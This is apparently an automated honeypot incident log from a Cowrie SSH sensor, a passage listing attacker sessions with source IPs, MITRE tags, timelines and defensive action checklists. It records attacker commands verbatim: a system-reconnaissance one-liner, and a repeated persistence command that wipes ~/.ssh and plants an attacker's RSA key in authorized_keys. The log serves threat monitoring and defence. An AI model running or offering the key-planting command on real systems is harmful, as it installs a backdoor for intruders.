| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:37:59` | `cowrie.session.connect` |
| `2026-08-12 04:37:59` | `cowrie.client.version` |
| `2026-08-12 04:37:59` | `cowrie.client.kex` |
| `2026-08-12 04:38:00` | `cowrie.login.success` |
| `2026-08-12 04:38:02` | `cowrie.session.params` |
| `2026-08-12 04:38:02` | `cowrie.command.input` |
| `2026-08-12 04:38:02` | `cowrie.command.input` |
| `2026-08-12 04:38:02` | `cowrie.command.input` |
| `2026-08-12 04:38:02` | `cowrie.command.input` |
| `2026-08-12 04:38:02` | `cowrie.command.input` |
| `2026-08-12 04:38:02` | `cowrie.command.success` |
| `2026-08-12 04:38:02` | `cowrie.command.input` |
| `2026-08-12 04:38:02` | `cowrie.command.input` |
| `2026-08-12 04:38:02` | `cowrie.command.input` |
| `2026-08-12 04:38:02` | `cowrie.command.input` |
| `2026-08-12 04:38:02` | `cowrie.log.closed` |
| `2026-08-12 04:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-988981d6327b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:40 |
| **Last Seen** | 2026-08-12 04:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:40:28` | `cowrie.session.connect` |
| `2026-08-12 04:40:28` | `cowrie.client.version` |
| `2026-08-12 04:40:28` | `cowrie.client.kex` |
| `2026-08-12 04:40:30` | `cowrie.login.success` |
| `2026-08-12 04:40:31` | `cowrie.session.params` |
| `2026-08-12 04:40:31` | `cowrie.command.input` |
| `2026-08-12 04:40:31` | `cowrie.command.input` |
| `2026-08-12 04:40:31` | `cowrie.command.input` |
| `2026-08-12 04:40:31` | `cowrie.command.input` |
| `2026-08-12 04:40:31` | `cowrie.command.input` |
| `2026-08-12 04:40:31` | `cowrie.command.success` |
| `2026-08-12 04:40:31` | `cowrie.command.input` |
| `2026-08-12 04:40:31` | `cowrie.command.input` |
| `2026-08-12 04:40:31` | `cowrie.command.input` |
| `2026-08-12 04:40:31` | `cowrie.command.input` |
| `2026-08-12 04:40:31` | `cowrie.log.closed` |
| `2026-08-12 04:40:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df9bec6e51c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:42 |
| **Last Seen** | 2026-08-12 04:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:42:56` | `cowrie.session.connect` |
| `2026-08-12 04:42:56` | `cowrie.client.version` |
| `2026-08-12 04:42:56` | `cowrie.client.kex` |
| `2026-08-12 04:42:57` | `cowrie.login.success` |
| `2026-08-12 04:42:57` | `cowrie.session.params` |
| `2026-08-12 04:42:57` | `cowrie.command.input` |
| `2026-08-12 04:42:57` | `cowrie.command.input` |
| `2026-08-12 04:42:57` | `cowrie.command.input` |
| `2026-08-12 04:42:57` | `cowrie.command.input` |
| `2026-08-12 04:42:57` | `cowrie.command.input` |
| `2026-08-12 04:42:57` | `cowrie.command.success` |
| `2026-08-12 04:42:57` | `cowrie.command.input` |
| `2026-08-12 04:42:57` | `cowrie.command.input` |
| `2026-08-12 04:42:57` | `cowrie.command.input` |
| `2026-08-12 04:42:57` | `cowrie.command.input` |
| `2026-08-12 04:42:58` | `cowrie.log.closed` |
| `2026-08-12 04:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf6aabd3b8f

| Field | Detail |
|---|---|
| **Source IP** | `34.76.8[.]158` |
| **First Seen** | 2026-08-12 04:43 |
| **Last Seen** | 2026-08-12 04:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:43:41` | `cowrie.session.connect` |
| `2026-08-12 04:43:41` | `cowrie.login.success` |
| `2026-08-12 04:43:42` | `cowrie.session.params` |
| `2026-08-12 04:43:42` | `cowrie.command.input` |
| `2026-08-12 04:43:42` | `cowrie.command.input` |
| `2026-08-12 04:43:42` | `cowrie.command.failed` |
| `2026-08-12 04:43:42` | `cowrie.command.input` |
| `2026-08-12 04:43:42` | `cowrie.log.closed` |
| `2026-08-12 04:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.8[.]158` to AbuseIPDB if not already reported
- [ ] Block `34.76.8[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fb196a8c4da

| Field | Detail |
|---|---|
| **Source IP** | `34.76.8[.]158` |
| **First Seen** | 2026-08-12 04:43 |
| **Last Seen** | 2026-08-12 04:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:43:55` | `cowrie.session.connect` |
| `2026-08-12 04:43:55` | `cowrie.login.success` |
| `2026-08-12 04:43:55` | `cowrie.session.params` |
| `2026-08-12 04:43:55` | `cowrie.command.input` |
| `2026-08-12 04:43:55` | `cowrie.command.failed` |
| `2026-08-12 04:44:04` | `cowrie.log.closed` |
| `2026-08-12 04:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.8[.]158` to AbuseIPDB if not already reported
- [ ] Block `34.76.8[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fe66565170f

| Field | Detail |
|---|---|
| **Source IP** | `34.76.8[.]158` |
| **First Seen** | 2026-08-12 04:43 |
| **Last Seen** | 2026-08-12 04:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:43:57` | `cowrie.session.connect` |
| `2026-08-12 04:43:57` | `cowrie.login.success` |
| `2026-08-12 04:43:57` | `cowrie.session.params` |
| `2026-08-12 04:43:57` | `cowrie.command.input` |
| `2026-08-12 04:44:04` | `cowrie.log.closed` |
| `2026-08-12 04:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.8[.]158` to AbuseIPDB if not already reported
- [ ] Block `34.76.8[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8d8476d2dce

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:45 |
| **Last Seen** | 2026-08-12 04:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:45:19` | `cowrie.session.connect` |
| `2026-08-12 04:45:19` | `cowrie.client.version` |
| `2026-08-12 04:45:19` | `cowrie.client.kex` |
| `2026-08-12 04:45:20` | `cowrie.login.success` |
| `2026-08-12 04:45:21` | `cowrie.session.params` |
| `2026-08-12 04:45:21` | `cowrie.command.input` |
| `2026-08-12 04:45:21` | `cowrie.command.input` |
| `2026-08-12 04:45:21` | `cowrie.command.input` |
| `2026-08-12 04:45:21` | `cowrie.command.input` |
| `2026-08-12 04:45:21` | `cowrie.command.input` |
| `2026-08-12 04:45:21` | `cowrie.command.success` |
| `2026-08-12 04:45:21` | `cowrie.command.input` |
| `2026-08-12 04:45:21` | `cowrie.command.input` |
| `2026-08-12 04:45:21` | `cowrie.command.input` |
| `2026-08-12 04:45:21` | `cowrie.command.input` |
| `2026-08-12 04:45:22` | `cowrie.log.closed` |
| `2026-08-12 04:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69670f143f30

| Field | Detail |
|---|---|
| **Source IP** | `101.47.14[.]46` |
| **First Seen** | 2026-08-12 04:47 |
| **Last Seen** | 2026-08-12 04:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:47:12` | `cowrie.session.connect` |
| `2026-08-12 04:47:12` | `cowrie.client.version` |
| `2026-08-12 04:47:13` | `cowrie.client.kex` |
| `2026-08-12 04:47:13` | `cowrie.login.success` |
| `2026-08-12 04:47:14` | `cowrie.session.params` |
| `2026-08-12 04:47:14` | `cowrie.command.input` |
| `2026-08-12 04:47:14` | `cowrie.command.failed` |
| `2026-08-12 04:47:15` | `cowrie.log.closed` |
| `2026-08-12 04:47:16` | `cowrie.session.params` |
| `2026-08-12 04:47:16` | `cowrie.command.input` |
| `2026-08-12 04:47:16` | `cowrie.session.file_download` |
| `2026-08-12 04:47:16` | `cowrie.log.closed` |
| `2026-08-12 04:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.14[.]46` to AbuseIPDB if not already reported
- [ ] Block `101.47.14[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c87c961e591

| Field | Detail |
|---|---|
| **Source IP** | `101.47.14[.]46` |
| **First Seen** | 2026-08-12 04:47 |
| **Last Seen** | 2026-08-12 04:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:47:16` | `cowrie.session.connect` |
| `2026-08-12 04:47:16` | `cowrie.client.version` |
| `2026-08-12 04:47:17` | `cowrie.client.kex` |
| `2026-08-12 04:47:18` | `cowrie.login.success` |
| `2026-08-12 04:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.14[.]46` to AbuseIPDB if not already reported
- [ ] Block `101.47.14[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-161c7a96e63f

| Field | Detail |
|---|---|
| **Source IP** | `101.47.14[.]46` |
| **First Seen** | 2026-08-12 04:47 |
| **Last Seen** | 2026-08-12 04:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:47:18` | `cowrie.session.connect` |
| `2026-08-12 04:47:18` | `cowrie.client.version` |
| `2026-08-12 04:47:19` | `cowrie.client.kex` |
| `2026-08-12 04:47:20` | `cowrie.login.success` |
| `2026-08-12 04:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.14[.]46` to AbuseIPDB if not already reported
- [ ] Block `101.47.14[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff6465e30010

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:47 |
| **Last Seen** | 2026-08-12 04:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:47:45` | `cowrie.session.connect` |
| `2026-08-12 04:47:45` | `cowrie.client.version` |
| `2026-08-12 04:47:45` | `cowrie.client.kex` |
| `2026-08-12 04:47:46` | `cowrie.login.success` |
| `2026-08-12 04:47:47` | `cowrie.session.params` |
| `2026-08-12 04:47:47` | `cowrie.command.input` |
| `2026-08-12 04:47:47` | `cowrie.command.input` |
| `2026-08-12 04:47:47` | `cowrie.command.input` |
| `2026-08-12 04:47:47` | `cowrie.command.input` |
| `2026-08-12 04:47:47` | `cowrie.command.input` |
| `2026-08-12 04:47:47` | `cowrie.command.success` |
| `2026-08-12 04:47:47` | `cowrie.command.input` |
| `2026-08-12 04:47:47` | `cowrie.command.input` |
| `2026-08-12 04:47:47` | `cowrie.command.input` |
| `2026-08-12 04:47:47` | `cowrie.command.input` |
| `2026-08-12 04:47:48` | `cowrie.log.closed` |
| `2026-08-12 04:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd472f0a5325

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:50 |
| **Last Seen** | 2026-08-12 04:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:50:14` | `cowrie.session.connect` |
| `2026-08-12 04:50:14` | `cowrie.client.version` |
| `2026-08-12 04:50:15` | `cowrie.client.kex` |
| `2026-08-12 04:50:15` | `cowrie.login.success` |
| `2026-08-12 04:50:16` | `cowrie.session.params` |
| `2026-08-12 04:50:16` | `cowrie.command.input` |
| `2026-08-12 04:50:16` | `cowrie.command.input` |
| `2026-08-12 04:50:16` | `cowrie.command.input` |
| `2026-08-12 04:50:16` | `cowrie.command.input` |
| `2026-08-12 04:50:16` | `cowrie.command.input` |
| `2026-08-12 04:50:16` | `cowrie.command.success` |
| `2026-08-12 04:50:16` | `cowrie.command.input` |
| `2026-08-12 04:50:16` | `cowrie.command.input` |
| `2026-08-12 04:50:16` | `cowrie.command.input` |
| `2026-08-12 04:50:16` | `cowrie.command.input` |
| `2026-08-12 04:50:16` | `cowrie.log.closed` |
| `2026-08-12 04:50:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c12dfb55ddf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 04:52 |
| **Last Seen** | 2026-08-12 04:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:52:39` | `cowrie.session.connect` |
| `2026-08-12 04:52:39` | `cowrie.client.version` |
| `2026-08-12 04:52:39` | `cowrie.client.kex` |
| `2026-08-12 04:52:40` | `cowrie.login.success` |
| `2026-08-12 04:52:42` | `cowrie.session.params` |
| `2026-08-12 04:52:42` | `cowrie.command.input` |
| `2026-08-12 04:52:42` | `cowrie.command.input` |
| `2026-08-12 04:52:42` | `cowrie.command.input` |
| `2026-08-12 04:52:42` | `cowrie.command.input` |
| `2026-08-12 04:52:42` | `cowrie.command.input` |
| `2026-08-12 04:52:42` | `cowrie.command.success` |
| `2026-08-12 04:52:42` | `cowrie.command.input` |
| `2026-08-12 04:52:42` | `cowrie.command.input` |
| `2026-08-12 04:52:42` | `cowrie.command.input` |
| `2026-08-12 04:52:42` | `cowrie.command.input` |
| `2026-08-12 04:52:42` | `cowrie.log.closed` |
| `2026-08-12 04:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bc9e5dca398

| Field | Detail |
|---|---|
| **Source IP** | `211.240.117[.]75` |
| **First Seen** | 2026-08-12 04:53 |
| **Last Seen** | 2026-08-12 04:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:53:00` | `cowrie.session.connect` |
| `2026-08-12 04:53:00` | `cowrie.client.version` |
| `2026-08-12 04:53:00` | `cowrie.client.kex` |
| `2026-08-12 04:53:01` | `cowrie.login.success` |
| `2026-08-12 04:53:02` | `cowrie.session.params` |
| `2026-08-12 04:53:02` | `cowrie.command.input` |
| `2026-08-12 04:53:02` | `cowrie.command.failed` |
| `2026-08-12 04:53:02` | `cowrie.log.closed` |
| `2026-08-12 04:53:03` | `cowrie.session.params` |
| `2026-08-12 04:53:03` | `cowrie.command.input` |
| `2026-08-12 04:53:03` | `cowrie.session.file_download` |
| `2026-08-12 04:53:03` | `cowrie.log.closed` |
| `2026-08-12 04:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.240.117[.]75` to AbuseIPDB if not already reported
- [ ] Block `211.240.117[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f69c105dba

| Field | Detail |
|---|---|
| **Source IP** | `211.240.117[.]75` |
| **First Seen** | 2026-08-12 04:53 |
| **Last Seen** | 2026-08-12 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:53:03` | `cowrie.session.connect` |
| `2026-08-12 04:53:03` | `cowrie.client.version` |
| `2026-08-12 04:53:03` | `cowrie.client.kex` |
| `2026-08-12 04:53:04` | `cowrie.login.success` |
| `2026-08-12 04:53:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.240.117[.]75` to AbuseIPDB if not already reported
- [ ] Block `211.240.117[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-108fcc13fcba

| Field | Detail |
|---|---|
| **Source IP** | `211.240.117[.]75` |
| **First Seen** | 2026-08-12 04:53 |
| **Last Seen** | 2026-08-12 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:53:05` | `cowrie.session.connect` |
| `2026-08-12 04:53:05` | `cowrie.client.version` |
| `2026-08-12 04:53:05` | `cowrie.client.kex` |
| `2026-08-12 04:53:06` | `cowrie.login.success` |
| `2026-08-12 04:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.240.117[.]75` to AbuseIPDB if not already reported
- [ ] Block `211.240.117[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd25167a6d5c

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-08-12 04:54 |
| **Last Seen** | 2026-08-12 04:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 04:54:48` | `cowrie.session.connect` |
| `2026-08-12 04:54:49` | `cowrie.client.version` |
| `2026-08-12 04:54:49` | `cowrie.client.kex` |
| `2026-08-12 04:54:51` | `cowrie.login.success` |
